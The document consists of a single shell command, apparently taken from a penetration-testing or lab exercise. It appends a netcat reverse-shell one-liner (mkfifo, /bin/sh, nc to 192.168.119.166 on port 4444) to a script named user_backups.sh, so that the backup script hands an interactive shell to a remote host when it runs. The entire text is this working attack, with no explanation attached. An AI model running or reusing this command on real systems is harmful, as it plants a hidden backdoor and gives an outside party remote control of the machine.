echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.166 4444 >/tmp/f" >> user_backups.sh
